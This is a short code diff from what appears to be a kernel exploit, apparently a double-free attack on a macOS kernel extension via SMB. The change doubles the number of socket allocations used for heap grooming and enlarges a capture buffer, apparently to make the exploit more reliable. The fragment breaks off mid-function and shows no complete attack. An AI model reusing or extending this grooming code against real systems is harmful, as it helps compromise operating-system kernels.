@@ -182,13 +182,13 @@ struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_s
 void kmem_zkext_free_session_execute(kmem_zkext_free_session_t session, const struct complete_nic_info_entry* entry) {
     assert(session->state == STATE_PREPARED);
     
-    for (int i = 0; i < 25; i++) {
-        XE_LOG_DEBUG("allocate sockets for nic %d / %d", i, 25);
+    for (int i = 0; i < 50; i++) {
+        XE_LOG_DEBUG("allocate sockets for nic %d / %d", i, 50);
         kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
     }
 
     kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, (uint32_t)entry->nic_index, 512, 96);
-    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 160);
+    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 320);
 
     dispatch_semaphore_t sem_dbf_trigger = dispatch_semaphore_create(0);
     dispatch_async(xe_dispatch_queue(), ^() {
